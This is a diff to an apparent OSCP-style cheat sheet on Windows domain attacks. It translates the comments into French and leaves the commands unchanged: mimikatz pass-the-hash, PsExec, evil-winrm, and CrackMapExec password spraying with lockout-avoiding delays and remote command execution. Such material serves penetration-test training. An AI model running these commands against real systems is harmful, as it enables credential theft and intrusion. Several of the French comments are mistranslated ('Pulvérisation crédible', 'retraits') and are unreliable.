@@ -23,7 +23,7 @@ powershell -ExecutionPolicy Bypass -File [script].ps1
 ```powershell
 mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell
 
-# You can then execute commands in the PowerShell session as if you were logged in as the other user, for example here we are moving to another system as the other user and running a shell:
+# Vous pouvez alors exécuter des commandes dans la session PowerShell comme si vous étiez connecté comme l'autre utilisateur, par exemple ici, nous passons à un autre système comme l'autre utilisateur et exécutant un shell:
 .\PsExec.exe \\<target_system> cmd
 ```
 
@@ -41,7 +41,7 @@ evil-winrm -u <username> -p <password> -i <target_ip>
 
 
 ```bash
-# Use -S option to ignore SSL validation for insecure systems.
+# Utilisez l'option -S pour ignorer la validation SSL pour les systèmes non sécurisés.
 evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
 # or
 evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>
@@ -173,7 +173,7 @@ wmic /node:<target_ip> /user:<username> /password:<password> process call create
 ```
 
 
-## Credential Spraying with CrackMapExec
+## Pulvérisation crédible avec CrackMapExec
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -190,13 +190,13 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-command-note">Examiner les objets exposés par RPC.</p>
 
 ```bash
-# Check policies with a tool like rpcclient
+# Vérifier les politiques avec un outil comme rpcclient
 rpcclient -U "" <DOMAIN_IP> -c "getdompwinfo"
 
-# Test multiple passwords with a delay to avoid lockouts
+# Tester plusieurs mots de passe avec un délai pour éviter les lockouts
 crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5
 
-# Test multiple passwords with a max retries limit to avoid lockouts
+# Tester plusieurs mots de passe avec une limite maximale de retraits pour éviter les lockouts
 crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
 ```
 
@@ -204,7 +204,7 @@ crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Use CrackMapExec's --target option to narrow focus
+# Utilisez l'option --target de CrackMapExec pour réduire la focalisation
 crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt
 ```
 
@@ -249,7 +249,7 @@ nmap -p 5985,1433,445,3389 <TARGET_IP>
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Test both passwords and NTLM hashes
+# Tester les mots de passe et les hachages NTLM
 crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOMAIN_NAME>
 ```
 
@@ -262,31 +262,31 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Test a single password across all users in the domain
+# Tester un mot de passe unique pour tous les utilisateurs du domaine
 crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5
 
-# Test multiple passwords with a delay to avoid lockouts
+# Tester plusieurs mots de passe avec un délai pour éviter les lockouts
 crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5
 ```
 
 
 ```bash
-# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com)
+# Énumérer les sous-domaines avec des identifiants valides et des identifiants de test (par exemple un domaine spécifique à la station de travail, comme station de travail1.domain.com)
 crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>
 ```
 
 
 ```bash
-# Test credentials against local accounts not part of the domain
+# Tester les références sur les comptes locaux qui ne font pas partie du domaine
 crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth
 ```
 
 
 ```bash
-# Execute a command on a remote machine with valid credentials
+# Exécuter une commande sur une machine distante avec des identifiants valides
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
 ```
 
@@ -299,40 +299,40 @@ Observer les permissions et la configuration de Windows.
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Test credentials on the main domain via WinRM
+# Tester les références sur le domaine principal via WinRM
 crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5
 
-# Test NTLM hash
+# Essai du hachage NTLM
 crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --spray --delay 5
 
-# Execute a command
+# Exécuter une commande
 crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
 ```
 
 
 ```bash
-# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com). Authenticate on a subdomain
+# Énumérer les sous-domaines avec des identifiants valides et des identifiants de test (par exemple un domaine spécifique à la station de travail, comme station de travail1.domain.com). Authentifier sur un sous-domaine
 crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
 ```
 
 
 ```bash
-# Authenticate with a local user account
+# Authentifier avec un compte utilisateur local
 crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 ```
 
 
 ```bash
-# Execute a command remotely
+# Exécuter une commande à distance
 crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "ipconfig"
 
-# Using an NTLM hash
+# Avec un hash NTLM
 crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "ipconfig"
 ```
 
@@ -345,7 +345,7 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Gain a shell using valid credentials
+# Gagnez un shell en utilisant des identifiants valides
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec
 
 # Gain a shell using NTLM hash
@@ -354,10 +354,10 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exe
 
 
 ```bash
-# Execute a remote command
+# Exécuter une commande distante
 crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
 
-# Using an NTLM hash
+# Avec un hash NTLM
 crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
 ```
 
@@ -368,7 +368,7 @@ crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "w
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Gain a shell using valid credentials
+# Gagnez un shell en utilisant des identifiants valides
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method wmiexec
 
 # Gain a shell using NTLM hash
@@ -384,19 +384,19 @@ Examiner les objets, les droits et les services du domaine.
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Authenticate and enumerate users on the main domain
+# Authentifier et énumérer les utilisateurs sur le domaine principal
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
 ```
 
 
 ```bash
-# Enumerate users on a subdomain
+# Énumérer les utilisateurs sur un sous-domaine
 crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
 ```
 
@@ -409,28 +409,28 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Test main domain credentials on an MSSQL server
+# Tester les identifiants de domaine principal sur un serveur MSSQL
 crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
 ```
 
 
 ```bash
-# Test credentials on a subdomain MSSQL server
+# Tester les références sur un serveur sous-domaine MSSQL
 crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
 ```
 
 
 ```bash
-# Test local user credentials on MSSQL
+# Tester les identifiants des utilisateurs locaux sur MSSQL
 crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 ```
 
@@ -441,28 +441,28 @@ crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 <p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
-# Test credentials against an RDP service on the main domain
+# Tester les références d'un service RDP sur le domaine principal
 crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
 ```
 
 
 ```bash
-# Test credentials on an RDP service in a subdomain
+# Tester les références sur un service RDP dans un sous-domaine
 crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
 ```
 
 
 ```bash
-# Authenticate to RDP with local credentials
+# Authentifier à RDP avec les identifiants locaux
 crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 
-# Using NTLM hash
+# Avec le hash NTLM
 crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 ```
 
